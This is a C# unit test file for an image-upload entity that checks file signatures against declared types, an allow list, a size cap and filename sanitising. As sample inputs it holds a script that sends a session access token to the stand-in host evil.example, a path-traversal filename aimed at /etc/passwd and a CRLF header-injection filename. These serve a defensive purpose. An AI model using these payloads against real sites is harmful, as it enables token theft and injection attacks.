using RealEstate.Domain.Entities;

namespace RealEstate.Domain.Tests;

/// <summary>
/// The upload endpoint trusted the Content-Type the browser sent. Anything at all could be
/// uploaded as "image/png" — a script, an HTML page — and the site then served those bytes
/// back from its OWN origin under a type it asserted. Checking the file's own signature is
/// what makes the claim true.
/// </summary>
public class StoredImageTests
{
    private static byte[] Png() =>
        [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D];
    private static byte[] Jpeg() => [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46];
    private static byte[] Gif() => "GIF89a....."u8.ToArray();
    private static byte[] Webp() => [.. "RIFF"u8, 0x1A, 0x00, 0x00, 0x00, .. "WEBP"u8];

    [Fact]
    public void A_real_png_is_accepted()
    {
        var result = StoredImage.Create("photo.png", "image/png", Png());
        Assert.True(result.IsSuccess, TestData.Describe(result.Errors));
    }

    [Theory]
    [InlineData("image/jpeg")]
    [InlineData("image/png")]
    [InlineData("image/gif")]
    [InlineData("image/webp")]
    public void Every_allowed_type_accepts_its_own_signature(string contentType)
    {
        byte[] data = contentType switch
        {
            "image/jpeg" => Jpeg(),
            "image/png" => Png(),
            "image/gif" => Gif(),
            _ => Webp(),
        };

        Assert.True(StoredImage.LooksLikeImage(data, contentType));
    }

    [Fact]
    public void An_html_page_uploaded_as_a_png_is_refused()
    {
        var html = "<html><script>fetch('https://evil.example/'+sessionStorage.getItem('qre.accessToken'))</script>"u8.ToArray();

        var result = StoredImage.Create("innocent.png", "image/png", html);

        Assert.True(result.IsError);
        Assert.Equal("Image.ContentDoesNotMatchType", result.TopError.Code);
    }

    [Fact]
    public void A_png_uploaded_as_a_jpeg_is_refused()
    {
        // Not an attack, just wrong — and the file would be served with a type it is not.
        Assert.False(StoredImage.LooksLikeImage(Png(), "image/jpeg"));
    }

    [Fact]
    public void A_type_that_is_not_on_the_allow_list_is_refused()
    {
        var result = StoredImage.Create("x.svg", "image/svg+xml", "<svg/>"u8.ToArray());

        Assert.True(result.IsError);
        Assert.Equal("Image.ContentTypeNotAllowed", result.TopError.Code);
    }

    [Fact]
    public void An_empty_file_is_refused()
    {
        Assert.True(StoredImage.Create("empty.png", "image/png", []).IsError);
    }

    [Fact]
    public void A_file_over_the_size_cap_is_refused()
    {
        var tooBig = new byte[StoredImage.MaxSizeBytes + 1];
        Png().CopyTo(tooBig, 0);

        var result = StoredImage.Create("huge.png", "image/png", tooBig);

        Assert.True(result.IsError);
        Assert.Equal("Image.TooLarge", result.TopError.Code);
    }

    // ---- the stored NAME is echoed back in a Content-Disposition header --------------------

    [Theory]
    [InlineData("../../etc/passwd.png", "passwd.png")]
    [InlineData("C:\\Users\\me\\photo.png", "photo.png")]
    [InlineData("/var/www/photo.png", "photo.png")]
    public void A_path_is_reduced_to_its_last_segment(string given, string expected)
    {
        var result = StoredImage.Create(given, "image/png", Png());

        Assert.True(result.IsSuccess, TestData.Describe(result.Errors));
        Assert.Equal(expected, result.Value.FileName);
    }

    [Fact]
    public void Control_characters_are_stripped_so_a_header_cannot_be_injected()
    {
        var result = StoredImage.Create("photo\r\nX-Injected: yes.png", "image/png", Png());

        Assert.True(result.IsSuccess);
        Assert.DoesNotContain('\r', result.Value.FileName);
        Assert.DoesNotContain('\n', result.Value.FileName);
    }

    [Fact]
    public void A_name_that_is_nothing_but_a_path_still_produces_a_usable_name()
    {
        var result = StoredImage.Create("some/folder/", "image/png", Png());

        Assert.True(result.IsSuccess);
        Assert.False(string.IsNullOrWhiteSpace(result.Value.FileName));
    }
}
